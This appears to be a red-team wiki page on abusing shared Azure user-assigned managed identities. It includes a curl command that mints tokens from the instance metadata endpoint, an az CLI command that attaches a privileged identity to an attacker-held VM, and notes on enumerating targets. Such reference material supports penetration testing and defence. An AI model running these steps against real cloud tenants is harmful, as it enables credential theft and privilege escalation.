---
title: "User-assigned: a shared identity reusable across resources"
description: "Abusing user-assigned managed identities shared across resources: minting their tokens and attaching the identity to a resource you control."
keywords:
  - user-assigned
  - managed identity
  - shared identity
  - token
  - client id
---

# User-assigned

A user-assigned managed identity is a standalone resource that can be attached to many compute resources at once. That reuse is the attacker's gift: the same identity (and its RBAC) is reachable from every resource it is bound to, and it can be attached to a new resource you control.

## Minting a user-assigned token

```bash
# client_id selects which user-assigned identity on a multi-identity resource
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<uami-client-id>"
```

## Attaching it to a resource you hold

```bash
az vm identity assign --name <vm-you-control> -g <rg> \
  --identities /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami>
# then mint its token on that VM
```

## Exploitation notes

- Enumerate which resources share a user-assigned identity (Resource Graph on `identity.userAssignedIdentities`): compromising any one of them yields the identity, and the identity may be far more privileged than the host.
- Attaching a privileged user-assigned identity to a resource you already control is the [managed identity assignment](../privilege-escalation/managed-identity-assignment.md) escalation; this page is the token mechanics and the reuse angle.
- You need the identity's `client_id` to select it on a resource that carries more than one.

## Tools

- **az cli** (`az identity list`, `az vm identity assign`).
- **Resource Graph** to map identity-to-resource bindings.
- **BARK** for the attack-path view.

## References

- [SpecterOps: managed identity attack paths (BARK)](https://github.com/BloodHoundAD/BARK)
- [Microsoft: user-assigned managed identities](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/overview)
- [HackTricks Cloud: Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
